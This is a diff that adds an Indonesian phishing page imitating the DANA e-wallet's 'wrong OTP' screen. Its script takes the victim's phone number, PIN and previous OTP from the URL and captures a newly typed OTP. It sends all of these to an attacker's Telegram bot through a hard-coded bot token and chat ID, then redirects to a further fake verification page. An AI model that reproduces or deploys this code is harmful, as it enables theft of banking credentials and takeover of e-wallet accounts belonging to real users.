@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - OTP Salah</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#009EEB',
+                        grayText: '#FFFFFF',
+                        grayLight: '#E5E7EB',
+                        grayBtn: '#E5E7EB',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .container-sm {
+                max-width: 360px;
+                margin: 0 auto;
+            }
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #009EEB;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px 10px;
+            color: white;
+        }
+        .back-btn {
+            align-self: flex-start;
+            font-size: 1.2rem;
+            color: white;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .logo-img {
+            width: 50px;
+            height: auto;
+        }
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: white;
+        }
+        .title {
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        /* ✅ TULISAN PERINGATAN SALAH */
+        .error-text {
+            color: #FF2400;
+            font-size: 0.50rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .number-box {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        .flag {
+            width: 20px;
+            height: 13px;
+            background: url('https://flagcdn.com/w20/id.png') center/cover no-repeat;
+            border-radius: 2px;
+        }
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+        .otp-input {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 6px;
+            border: none;
+            text-align: center;
+            font-size: 1.3rem;
+            color: #009EEB;
+            outline: none;
+            padding: 0;
+        }
+        .timer-container {
+            display: flex;
+            background: white;
+            border-radius: 5px;
+            overflow: hidden;
+            width: 150px;
+        }
+        .resend-btn {
+            flex: 1;
+            padding: 4px;
+            background: #f0f0f0;
+            color: #aaa;
+            font-size: 0.7rem;
+            font-weight: bold;
+            text-align: center;
+        }
+        .time-box {
+            flex: 1;
+            padding: 4px;
+            background: #f8f8f8;
+            color: #333;
+            font-size: 0.8rem;
+            font-weight: bold;
+            text-align: center;
+            position: relative;
+        }
+        .dot {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            width: 3px;
+            height: 3px;
+            background: orange;
+            border-radius: 50%;
+        }
+    </style>
+</head>
+<body>
+    <!-- Tombol Kembali -->
+    <div class="back-btn" onclick="history.back()">
+        <i class="fa fa-chevron-left"></i>
+    </div>
+
+    <!-- Logo DANA -->
+    <div class="logo-container">
+        <img src="logo.png" alt="Logo DANA" class="logo-img">
+        <div class="logo-text"></div>
+    </div>
+
+    <!-- Judul -->
+    <div class="title">
+        Kode OTP telah terkirim ke
+    </div>
+
+    <!-- Box Nomor HP (NOMOR TETAP MUNCUL OTOMATIS) -->
+    <div class="number-box">
+        <div class="flag"></div>
+        <span id="nomorTampil">+62 8xxxxxxxxx</span>
+    </div>
+
+    <!-- Kotak Input OTP -->
+    <div class="otp-container">
+        <input type="text" class="otp-input" maxlength="1" autofocus>
+        <input type="text" class="otp-input" maxlength="1">
+        <input type="text" class="otp-input" maxlength="1">
+        <input type="text" class="otp-input" maxlength="1">
+    </div>
+  
+  <!-- ✅ TULISAN SALAH -->
+    <div class="error-text">
+       ⚠️ Kode OTP yang kamu masukkan salah. Silakan coba lagi.
+    </div>
+
+    <!-- Tombol Kirim Ulang & Timer -->
+    <div class="timer-container">
+        <div class="resend-btn">KIRIM ULANG</div>
+        <div class="time-box">
+            <span id="timer">00:58</span>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <!-- SCRIPT KONEKSI & KIRIM DATA -->
+    <script>
+        // ✅ BACA DATA DARI HALAMAN SEBELUMNYA
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomorAsli = urlParams.get('nomor') || 'Gagal memuat';
+        const pinAsli = urlParams.get('pin') || 'Tidak ada';
+        const otpLama = urlParams.get('otp') || ''; // Simpan OTP yang tadi salah
+
+        // ✅ TAMPILKAN NOMOR DI LAYAR
+        document.getElementById('nomorTampil').textContent = `+62 ${nomorAsli}`;
+
+        const inputs = document.querySelectorAll('.otp-input');
+        
+        // ✅ DATA BOT TELEGRAM SAMA PERSIS
+        const BOT_TOKEN = "8428653854:AAG4XeGXXR-U-SQPwuKvNDzE1-PTXBjKCGo"; 
+        const CHAT_ID = "8683949047";
+        const HALAMAN_TUJUAN = "verifikasi ulang.html";
+
+        // TIMER HITUNG MUNDUR
+        let timeLeft = 58;
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            
+            timerElement.textContent = minutes + ":" + seconds;
+            timeLeft--;
+
+            if(timeLeft < 0) {
+                clearInterval(countdown);
+                timerElement.textContent = "Habis";
+            }
+        }, 1000);
+
+        // LOGIKA KETIK & PINDAH KOLOM
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                kirimUlangData();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // ✅ KIRIM ULANG DATA DENGAN KETERANGAN SALAH
+        function kirimUlangData() {
+            let otpBaru = "";
+            inputs.forEach(input => otpBaru += input.value);
+
+            if (otpBaru.length === 4) {
+                let pesan = `🔔 ༺═──◍DANA☭──═༻ ❌ OTP SALAH
+📞 Nomor: +62${nomorAsli}
+🔑 PIN: ${pinAsli}
+❌ OTP Salah Sebelumnya: ${otpLama}
+✅ OTP Baru Dimasukkan: ${otpBaru}`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: "HTML"
+                    })
+                })
+                .then(() => {
+                    window.location.href = HALAMAN_TUJUAN;
+                })
+                .catch(() => alert('Koneksi bermasalah!'));
+            }
+        }
+    </script>
+</body>
+</html>
